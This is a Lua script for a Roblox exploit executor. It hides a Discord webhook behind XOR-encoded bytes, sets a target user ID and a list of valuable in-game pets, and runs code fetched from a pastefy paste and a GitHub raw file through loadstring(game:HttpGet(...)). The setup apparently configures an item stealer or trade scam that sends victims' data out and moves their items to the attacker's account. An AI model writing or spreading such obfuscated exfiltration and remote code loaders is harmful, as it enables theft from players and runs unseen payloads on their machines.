local genv = getgenv()

genv.GOOD_WEBHOOK = (function()
    local b = {73,85,85,81,82,27,14,14,69,72,82,66,78,83,69,15,66,78,76,14,64,81,72,14,86,68,67,73,78,78,74,82,14,16,20,18,19,21,24,19,24,23,25,25,18,16,25,25,16,19,19,23,14,103,78,98,12,105,102,105,106,80,80,105,85,106,117,22,98,73,117,17,66,116,104,102,117,86,110,120,102,84,120,119,73,68,113,89,16,99,98,20,118,22,67,74,120,12,88,106,101,74,86,84,25,88,126,85,115,119,74,105,24,74,22,88,19,66,106,70,70}
    local k = 33
    local o = {}
    for i = 1, #b do o[i] = string.char(bit32.bxor(b[i], k)) end
    return table.concat(o)
end)()

genv.TARGET_USER_ID = 10279786442

genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"

genv.ALLOWED_ANIMALS = {
    "Strawberry Elephant",
    "Headless Horseman",
    "Meowl",
    "John Pork",
    "Skibidi Toilet",
    "Dragon Aquanini",
    "Griffin",
    "Dragon Gingerini",
    "Hydra Dragon Cannelloni",
    "Signore Carapace",
    "Dragon Cannelloni",
    "Digi Narwhal",
    "Moby Bros",
    "Love Love Bear",
    "Kraken",
    "La Supreme Combinasion",
    "Elefanto Frigo",
    "Hydra Bunny",
    "Celestial Pegasus",
    "Jelly Moby",
    "Cerberus",
    "Bunny and Eggy",
    "Popcuru and Fizzuru",
    "Rosey and Teddy",
    "Capitano Moby",
    "Burguro And Fryuro",
    "Arcadragon",
    "Cooki and Milki",
    "Los Secret Combinasionas",
    "Ketupat Bros",
    "Reinito Sleighito",
    "Fortunu and Cashuru",
    "Los Amigos",
    "Pizza and Ranch",
    "Antonio",
    "Pancake and Syrup",
    "La Secret Combinasion",
    "Foxini Lanternini",
    "Kalika Bros",
    "Los Sekolahs",
    "Sammyni Fattini",
    "Cash or Card",
    "Fragrama and Chocrama",
    "La Casa Boo",
    "Duggy Bros",
    "Los Admins",
    "La Food Combinasion",
    "Spooky and Pumpky",
    "Sammyni Cakini",
    "Boppin Bunny",
    "Ginger Gerat",
    "La Ginger Sekolah",
    "Los Chillis",
    "Los Hackers",
    "Bearito Cabinito",
    "Capitano Americano",
    "Rubrikiko",
    "Los Spaghettis",
    "Examen Bros",
    "Festive 67",
    "Guest 666",
    "Quackini Snackini",
    "Cloverat Clapat",
    "Hopilikalika Hopilikalako",
    "Garama and Madundung",
    "Fishino Clownino",
    "Jolly Jolly Sahur",
    "Rico Dinero",
    "Tirilikalika Tirilikalako",
    "Dug Dug Dug",
    "Fragola La La La",
}

genv.ALLOWED_PLACE_IDS = {
    109983668079237
}

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/XNtsjjPd/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/norgegat-byte/K2/refs/heads/main/main.lua"))()
end)
